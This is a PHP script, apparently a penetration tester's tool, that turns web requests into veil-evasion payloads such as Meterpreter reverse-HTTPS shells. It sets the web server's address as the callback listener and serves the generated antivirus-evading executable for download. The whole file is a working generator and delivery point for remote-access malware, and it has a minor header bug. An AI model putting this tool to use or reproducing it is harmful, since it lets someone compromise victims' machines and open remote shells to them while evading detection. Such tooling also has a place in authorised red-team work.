<?php
  /*
    Generate and output a veil payload based on request params
    e.g. http://myhost/payloadgen/powershell/meterpreter/rev_https?PROXY=Y

    Requires: 
     - veil-evasion
     - Read / Write access to the veil output directory by the web user
     - mod_rewrite enabled and allowed for the web directory that this is in
  */
  $veil = "/usr/bin/veil-evasion";
  $lhost = $_SERVER["SERVER_ADDR"];     // Listen address = web server address
  $lport = 443;                         // Default listen port
  $basename = "nettitude";              // base name of generated file
  $webroot = "/payloadgen/";            // Install dir of this script

  // Payload to generate
  $payload = str_replace( $webroot, "", $_SERVER["REQUEST_URI"] );
  $payload = preg_replace( "/\?.*/", "", $payload );

  // Options to pass to veil
  $opts = "";
  if( sizeof( $_GET ) > 0 ){
    foreach( $_GET as $k => $v ){
      $opts .= ", ".escapeshellarg( $k )."=".escapeshellarg( $v );
    }
  }

  // Set default local port if not set by options
  if( empty( $_GET["LPORT"] ) ) $opts .= ", LPORT=$lport";

  // Exec command
  $cmd = $veil." -p ".escapeshellarg( $payload )." -c LHOST=$lhost, LPORT=$lport".$opts." -o $basename 2>&1";
  $out = shell_exec( $cmd );

  // Extract payload path
  if( preg_match( "/Executable written to:\s+.*(\/usr\/[^\s\[]+\.exe)/", $out, $m ) ){
    $filepath = $m[1];
  }else{
    preg_match( "/Payload File:\s+([^\s]+)/", $out, $m );
    $filepath = $m[1];
  }
  $filepath = trim( $filepath );
  $filename = basename( $filepath );
  
  // Serve file
  header( "Content-Disposition", "attachment;filename=$filename" );
  echo file_get_contents( $filepath );
?>
